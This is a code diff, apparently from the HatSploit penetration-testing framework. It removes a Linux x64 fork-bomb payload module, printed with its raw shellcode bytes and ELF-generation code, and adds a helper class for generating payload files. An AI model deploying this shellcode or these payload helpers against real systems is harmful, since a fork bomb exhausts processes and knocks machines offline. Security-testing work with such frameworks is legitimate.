@@ -24,38 +24,22 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import Payload
-from utils.hatvenom.hatvenom import HatVenom
+from utils.payload.payload import PayloadGenerator
 
 
-class HatSploitPayload(Payload, HatVenom):
-    details = {
-        'Category': "stager",
-        'Name': "Linux x64 Fork Bomb",
-        'Payload': "linux/x64/fork_bomb",
-        'Authors': [
-            'Ivan Nikolsky (enty8080)'
-        ],
-        'Description': "Fork bomb payload for Linux x64.",
-        'Dependencies': [
-            ''
-        ],
-        'Comments': [
-            ''
-        ],
-        'Architecture': "x64",
-        'Platform': "linux",
-        'Risk': "low",
-        'Type': "one_side"
-    }
+class HatVenom(PayloadGenerator):
+    def ip_bytes(self, ip):
+        return self.ip_to_bytes(ip)
 
-    def run(self):
-        self.output_process("Generating shellcode...")
-        shellcode = (
-            b"\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\xeb\xf5"
-        )
+    def port_bytes(self, port):
+        return self.port_to_bytes(port)
 
-        self.output_process("Generating payload...")
-        payload = self.generate('elf', 'x64', shellcode)
+    def string_bytes(self, string):
+        return self.string_to_bytes(string)
 
-        return payload
+    def generate(self, file_format, arch, shellcode, offsets={}):
+        return self.generate_payload(file_format, arch, shellcode, offsets)
+
+    def generate_to(self, file_format, arch, shellcode, offsets={}, filename='a.out'):
+        with open(filename, 'wb') as f:
+            f.write(self.generate_payload(file_format, arch, shellcode, offsets))
